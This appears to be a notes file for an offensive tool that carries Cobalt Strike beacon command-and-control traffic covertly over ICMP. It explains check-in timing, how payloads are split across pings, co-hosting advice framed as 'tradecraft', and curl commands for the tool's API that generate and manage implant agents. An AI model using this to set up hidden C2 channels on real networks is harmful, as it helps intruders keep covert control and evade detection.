# Notes

The following are a few useful notes about the behaviors of artifacts generated from
covert c2 ping.

The last check-in time on the covert c2 server will likely be much sooner then the last
check-in time on the cobalt strike server.  This is because the former is the last time
a ping was receive while the latter is the last time a complete message was received.
Covert c2 artifacts break beacon messages up in multiple pings. So if a cobalt strike
message takes 3 pings the last check-in time on the team server will be 3 times longer
then the covert c2 last check-in.

An icmp message and only carry a few bytes of data at a time.  Keep that in mind when
trying to send/receive a large payload.  Actions like spawning and pivoting require that
a new beacon be generated and sent from the team server.  In this case the beacon message
may be multiple Mb and take hundreds or thousands of pings to complete (It takes about
 3hrs).  Currently there is no way to cancel a message like this without closing the
 session completely

The covert c2 server can be hosted on the same server as the team server and is probably
more efficient to do it that way, keep trade craft in mind however.

The covert c2 server hosts its control panel on 0.0.0.0:8080, and is currently not
 configurable and is unauthenticated.  Use IP tables or some other firewall to protect
 access to this page.

 All actions that the web page takes are via web apis and can easily be CURL'ed or scripted

```
curl myserver:8080/api/agents

curl -X POST myserver:8080/api/agents -H "Content-Type: application/json" \
   --data '{"arch":"x64","sleep":2,"pipe":"mypipe","host":"myserver"}' --output artifact

curl -X PATCH 172.30.1.254:8080/api/agents -H "Content-Type: application/json" --data '{"agentid":1,"sleep":10}'

curl -X DELETE myserver:8080/api/agents -H "Content-Type: application/json" --data '{"agentid":1}'

```
